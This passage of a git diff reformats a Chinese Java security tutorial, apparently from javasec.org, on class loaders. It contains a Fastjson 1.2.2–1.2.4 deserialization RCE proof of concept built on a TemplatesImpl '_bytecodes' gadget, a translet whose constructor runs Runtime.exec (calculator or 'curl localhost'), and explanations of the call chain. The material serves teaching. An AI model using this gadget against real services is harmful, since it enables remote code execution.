-	 * @throws Exception 调用异常
-	 */
-	public static void invokeConstructor() throws Exception {
-		// 获取TemplatesImpl构造方法
-		Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
-				byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
-		);
+    /**
+     * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
+     *
+     * @throws Exception 调用异常
+     */
+    public static void invokeConstructor() throws Exception {
+        // 获取TemplatesImpl构造方法
+        Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
+                byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
+        );
 
-		// 修改访问权限
-		constructor.setAccessible(true);
+        // 修改访问权限
+        constructor.setAccessible(true);
 
-		// 创建TemplatesImpl实例
-		TemplatesImpl template = constructor.newInstance(
-				new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
-		);
+        // 创建TemplatesImpl实例
+        TemplatesImpl template = constructor.newInstance(
+                new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
+        );
 
-		template.getOutputProperties();
-	}
+        template.getOutputProperties();
+    }
 
-	/**
-	 * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
-	 */
-	public static void fastjsonRCE() {
-		// 构建恶意的JSON
-		Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
-		dataMap.put("@type", TemplatesImpl.class.getName());
-		dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
-		dataMap.put("_name", "");
-		dataMap.put("_tfactory", new Object());
-		dataMap.put("_outputProperties", new Object());
+    /**
+     * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
+     */
+    public static void fastjsonRCE() {
+        // 构建恶意的JSON
+        Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
+        dataMap.put("@type", TemplatesImpl.class.getName());
+        dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
+        dataMap.put("_name", "");
+        dataMap.put("_tfactory", new Object());
+        dataMap.put("_outputProperties", new Object());
 
-		// 生成Payload
-		String json = JSON.toJSONString(dataMap);
-		System.out.println(json);
+        // 生成Payload
+        String json = JSON.toJSONString(dataMap);
+        System.out.println(json);
 
-		// 使用FastJson反序列化，但必须启用SupportNonPublicField特性
-		JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
-	}
+        // 使用FastJson反序列化，但必须启用SupportNonPublicField特性
+        JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
+    }
 
-	public static void main(String[] args) throws Exception {
-//		invokeField();
-//		invokeConstructor();
-		  fastjsonRCE();
-	}
+    public static void main(String[] args) throws Exception {
+//      invokeField();
+//      invokeConstructor();
+        fastjsonRCE();
+    }
 
 }
 ```
@@ -790,31 +790,31 @@ import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
 import java.io.IOException;
 
 public class TestAbstractTranslet extends AbstractTranslet {
-	public TestAbstractTranslet() {
-    // Windows和MacOS是弹出计算器，Linux会执行curl localhost:9999/
-		String command = "open -a Calculator.app";
-		String osName  = System.getProperty("os.name");
+    public TestAbstractTranslet() {
+        // Windows和MacOS是弹出计算器，Linux会执行curl localhost:9999/
+        String command = "open -a Calculator.app";
+        String osName  = System.getProperty("os.name");
 
-		if (osName.startsWith("Windows")) {
-			command = "calc 12345678901234567";
-		} else if (osName.startsWith("Linux")) {
-			command = "curl localhost:9999/";
-		}
+        if (osName.startsWith("Windows")) {
+            command = "calc 12345678901234567";
+        } else if (osName.startsWith("Linux")) {
+            command = "curl localhost:9999/";
+        }
 
-		try {
-			Runtime.getRuntime().exec(command);
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
-	}
+        try {
+            Runtime.getRuntime().exec(command);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
 
-	@Override
-	public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-	}
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+    }
 
-	@Override
-	public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
-	}
+    @Override
+    public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
+    }
 }
 ```
 
@@ -822,45 +822,45 @@ Fastjson会创建`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类
 
 Fastjson在解析类成员变量（`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField`）的时候会将`private Properties _outputProperties;`属性与`getOutputProperties()`关联映射（FastJson的`smartMatch()`会忽略`_`、`-`、`is`（仅限boolean/Boolean类型），所以能够匹配到`getOutputProperties()`方法），因为`_outputProperties`是Map类型（Properties是Map的子类）所以不需要通过set方法映射值（`fieldInfo.getOnly`），因此在setValue的时候会直接调用`getOutputProperties()`方法，如下图：
 
-<img src="https://oss.javasec.org/images/202110251829689.png" alt="image-20211023201104486"  />
+![img](https://oss.javasec.org/images/202110251829689.png)
 
 调用`getOutputProperties()`方法后会触发类创建和实例化，如下图：
 
-<img src="https://oss.javasec.org/images/202110251829680.png" alt="image-20211021200026024"  />
+![img](https://oss.javasec.org/images/202110251829680.png)
 
 **defineClass TestAbstractTranslet调用链：**
 
 ```java
 java.lang.ClassLoader.defineClass(ClassLoader.java:794)
-java.lang.ClassLoader.defineClass(ClassLoader.java:643)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
-com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
-com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+        java.lang.ClassLoader.defineClass(ClassLoader.java:643)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:163)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:367)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:404)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+        com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+        com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
 ```
 
 创建`TestAbstractTranslet`类实例，如下图：
 
-<img src="https://oss.javasec.org/images/202110251829828.png" alt="image-20211023203901358"  />
+![img](https://oss.javasec.org/images/202110251829828.png)
 
 创建`TestAbstractTranslet`类实例时就会触发`TestAbstractTranslet`构造方法中的命令执行代码，调用链如下：
 
 ```java
 java.lang.Runtime.exec(Runtime.java:347)
-com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
-sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
-sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
-sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
-java.lang.reflect.Constructor.newInstance(Constructor.java:526)
-java.lang.Class.newInstance(Class.java:383)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
-com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
-com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
-com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
+        com.anbai.sec.classloader.TestAbstractTranslet.<init>(TestAbstractTranslet.java:24)
+        sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+        sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
+        sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+        java.lang.reflect.Constructor.newInstance(Constructor.java:526)
+        java.lang.Class.newInstance(Class.java:383)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:408)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:439)
+        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:460)
+        com.anbai.sec.classloader.XalanTemplatesImpl.invokeField(XalanTemplatesImpl.java:150)
+        com.anbai.sec.classloader.XalanTemplatesImpl.main(XalanTemplatesImpl.java:176)
 ```
 
 
@@ -890,156 +890,156 @@ import java.util.Map;
 
 public class TestJSPClassLoader {
 
-	/**
-	 * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载
-	 */
-	private final Map<File, JSPClassLoader> jspClassLoaderMap = new HashMap<File, JSPClassLoader>();
+    /**
+     * 缓存JSP文件和类加载，刚jsp文件修改后直接替换类加载器实现JSP类字节码热加载
+     */
+    private final Map<File, JSPClassLoader> jspClassLoaderMap = new HashMap<File, JSPClassLoader>();
 
-	/**
-	 * 创建用于测试的test.jsp类字节码，类代码如下：
-	 * <pre>
-	 * package com.anbai.sec.classloader;
-	 *
-	 * public class test_jsp {
-	 *     public void _jspService() {
-	 *         System.out.println("Hello...");
-	 *     }
-	 * }
-	 * </pre>
-	 *
-	 * @param className 类名
-	 * @param content   用于测试的输出内容，如：Hello...
-	 * @return test_java类字节码
-	 * @throws Exception 创建异常
-	 */
-	public static byte[] createTestJSPClass(String className, String content) throws Exception {
-		// 使用Javassist创建类字节码
-		ClassPool classPool = ClassPool.getDefault();
+    /**
+     * 创建用于测试的test.jsp类字节码，类代码如下：
+     * <pre>
+     * package com.anbai.sec.classloader;
+     *
+     * public class test_jsp {
+     *     public void _jspService() {
+     *         System.out.println("Hello...");
+     *     }
+     * }
+     * </pre>
+     *
+     * @param className 类名
+     * @param content   用于测试的输出内容，如：Hello...
+     * @return test_java类字节码
+     * @throws Exception 创建异常
+     */
+    public static byte[] createTestJSPClass(String className, String content) throws Exception {
+        // 使用Javassist创建类字节码
+        ClassPool classPool = ClassPool.getDefault();
 
-		// 创建一个类，如：com.anbai.sec.classloader.test_jsp
-		CtClass ctServletClass = classPool.makeClass(className);
+        // 创建一个类，如：com.anbai.sec.classloader.test_jsp
+        CtClass ctServletClass = classPool.makeClass(className);
 
-		// 创建_jspService方法
-		CtMethod ctMethod = new CtMethod(CtClass.voidType, "_jspService", new CtClass[]{}, ctServletClass);
-		ctMethod.setModifiers(Modifier.PUBLIC);
+        // 创建_jspService方法
+        CtMethod ctMethod = new CtMethod(CtClass.voidType, "_jspService", new CtClass[]{}, ctServletClass);
+        ctMethod.setModifiers(Modifier.PUBLIC);
 
-		// 写入hello方法代码
-		ctMethod.setBody("System.out.println(\"" + content + "\");");
+        // 写入hello方法代码
+        ctMethod.setBody("System.out.println(\"" + content + "\");");
 
-		// 将hello方法添加到类中
-		ctServletClass.addMethod(ctMethod);
+        // 将hello方法添加到类中
+        ctServletClass.addMethod(ctMethod);
 
-		// 生成类字节码
-		byte[] bytes = ctServletClass.toBytecode();
+        // 生成类字节码
+        byte[] bytes = ctServletClass.toBytecode();
 
-		// 释放资源
-		ctServletClass.detach();
+        // 释放资源
+        ctServletClass.detach();
 
-		return bytes;
-	}
+        return bytes;
+    }
 
-	/**
-	 * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码
-	 *
-	 * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
-	 * @param className 类名
-	 * @param bytes     类字节码
-	 * @param parent    JSP的父类加载
-	 */
-	public JSPClassLoader getJSPFileClassLoader(File jspFile, String className, byte[] bytes, ClassLoader parent) {
-		JSPClassLoader jspClassLoader = this.jspClassLoaderMap.get(jspFile);
+    /**
+     * 检测jsp文件是否改变，如果发生了修改就重新编译jsp并更新该jsp类字节码
+     *
+     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
+     * @param className 类名
+     * @param bytes     类字节码
+     * @param parent    JSP的父类加载
+     */
+    public JSPClassLoader getJSPFileClassLoader(File jspFile, String className, byte[] bytes, ClassLoader parent) {
+        JSPClassLoader jspClassLoader = this.jspClassLoaderMap.get(jspFile);
 
-		// 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建
-		if (jspClassLoader == null) {
-			jspClassLoader = new JSPClassLoader(parent);
-			jspClassLoader.createClass(className, bytes);
+        // 模拟第一次访问test.jsp时jspClassLoader是空的，因此需要创建
+        if (jspClassLoader == null) {
+            jspClassLoader = new JSPClassLoader(parent);
+            jspClassLoader.createClass(className, bytes);
 
-			// 缓存JSP文件和所使用的类加载器
-			this.jspClassLoaderMap.put(jspFile, jspClassLoader);
+            // 缓存JSP文件和所使用的类加载器
+            this.jspClassLoaderMap.put(jspFile, jspClassLoader);
 
-			return jspClassLoader;
-		}
+            return jspClassLoader;
+        }
 
-		// 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，
-		// 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，
-		// 那么需要热加载该类字节码到类加载器。
-		if (jspFile.lastModified() == 0) {
-			jspClassLoader = new JSPClassLoader(parent);
-			jspClassLoader.createClass(className, bytes);
+        // 模拟第二次访问test.jsp，这个时候内容发生了修改，这里实际上应该检测文件的最后修改时间是否相当，
+        // 而不是检测是否是0，因为当jspFile不存在的时候返回值是0，所以这里假设0表示这个文件被修改了，
+        // 那么需要热加载该类字节码到类加载器。
+        if (jspFile.lastModified() == 0) {
+            jspClassLoader = new JSPClassLoader(parent);
+            jspClassLoader.createClass(className, bytes);
 
-			// 缓存JSP文件和所使用的类加载器
-			this.jspClassLoaderMap.put(jspFile, jspClassLoader);
-			return jspClassLoader;
-		}
+            // 缓存JSP文件和所使用的类加载器
+            this.jspClassLoaderMap.put(jspFile, jspClassLoader);
+            return jspClassLoader;
+        }
 
-		return null;
-	}
+        return null;
+    }
 
-	/**
-	 * 使用动态的类加载器调用test_jsp#_jspService方法
-	 *
-	 * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
-	 * @param className 类名
-	 * @param bytes     类字节码
-	 * @param parent    JSP的父类加载
-	 */
-	public void invokeJSPServiceMethod(File jspFile, String className, byte[] bytes, ClassLoader parent) {
-		JSPClassLoader jspClassLoader = getJSPFileClassLoader(jspFile, className, bytes, parent);
+    /**
+     * 使用动态的类加载器调用test_jsp#_jspService方法
+     *
+     * @param jspFile   JSP文件对象，因为是模拟的jsp文件所以这个文件不需要存在
+     * @param className 类名
+     * @param bytes     类字节码
+     * @param parent    JSP的父类加载
+     */
+    public void invokeJSPServiceMethod(File jspFile, String className, byte[] bytes, ClassLoader parent) {
+        JSPClassLoader jspClassLoader = getJSPFileClassLoader(jspFile, className, bytes, parent);
 
-		try {
-			// 加载com.anbai.sec.classloader.test_jsp类
-			Class<?> jspClass = jspClassLoader.loadClass(className);
+        try {
+            // 加载com.anbai.sec.classloader.test_jsp类
+            Class<?> jspClass = jspClassLoader.loadClass(className);
 
-			// 创建test_jsp类实例
-			Object jspInstance = jspClass.newInstance();
+            // 创建test_jsp类实例
+            Object jspInstance = jspClass.newInstance();
 
-			// 获取test_jsp#_jspService方法
-			Method jspServiceMethod = jspClass.getMethod("_jspService");
+            // 获取test_jsp#_jspService方法
+            Method jspServiceMethod = jspClass.getMethod("_jspService");
 
-			// 调用_jspService方法
-			jspServiceMethod.invoke(jspInstance);
-		} catch (Exception e) {
-			e.printStackTrace();
-		}
-	}
+            // 调用_jspService方法
+            jspServiceMethod.invoke(jspInstance);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 
-	public static void main(String[] args) throws Exception {
-		TestJSPClassLoader test = new TestJSPClassLoader();
+    public static void main(String[] args) throws Exception {
+        TestJSPClassLoader test = new TestJSPClassLoader();
 
-		String      className   = "com.anbai.sec.classloader.test_jsp";
-		File        jspFile     = new File("/data/test.jsp");
-		ClassLoader classLoader = ClassLoader.getSystemClassLoader();
+        String      className   = "com.anbai.sec.classloader.test_jsp";
+        File        jspFile     = new File("/data/test.jsp");
+        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
 
-		// 模拟第一次访问test.jsp文件自动生成test_jsp.java
-		byte[] testJSPClass01 = createTestJSPClass(className, "Hello...");
+        // 模拟第一次访问test.jsp文件自动生成test_jsp.java
+        byte[] testJSPClass01 = createTestJSPClass(className, "Hello...");
 
-		test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);
+        test.invokeJSPServiceMethod(jspFile, className, testJSPClass01, classLoader);
 
-		// 模拟修改了test.jsp文件，热加载修改后的test_jsp.class
-		byte[] testJSPClass02 = createTestJSPClass(className, "World...");
-		test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);
-	}
+        // 模拟修改了test.jsp文件，热加载修改后的test_jsp.class
+        byte[] testJSPClass02 = createTestJSPClass(className, "World...");
+        test.invokeJSPServiceMethod(jspFile, className, testJSPClass02, classLoader);
+    }
 
-	/**
-	 * JSP类加载器
-	 */
-	static class JSPClassLoader extends ClassLoader {
+    /**
+     * JSP类加载器
+     */
+    static class JSPClassLoader extends ClassLoader {
 
-		public JSPClassLoader(ClassLoader parent) {
-			super(parent);
-		}
+        public JSPClassLoader(ClassLoader parent) {
+            super(parent);
+        }
 
-		/**
-		 * 创建类
-		 *
-		 * @param className 类名
-		 * @param bytes     类字节码
-		 */
-		public void createClass(String className, byte[] bytes) {
-			defineClass(className, bytes, 0, bytes.length);
-		}
+        /**
+         * 创建类
+         *
+         * @param className 类名
+         * @param bytes     类字节码
+         */
+        public void createClass(String className, byte[] bytes) {
+            defineClass(className, bytes, 0, bytes.length);
+        }
 
-	}
+    }
 
 }
 ```
